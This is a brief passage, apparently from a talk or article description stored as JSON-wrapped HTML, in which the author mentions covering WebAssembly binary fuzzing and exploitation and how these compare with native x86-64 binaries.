and how it translates into practical implementations.</p> <p>I also talk about WebAssembly binary fuzzing and exploitation, and issues that arise in comparison to native binaries (focusing on x86-64).</p> <p>Next</p>"}]}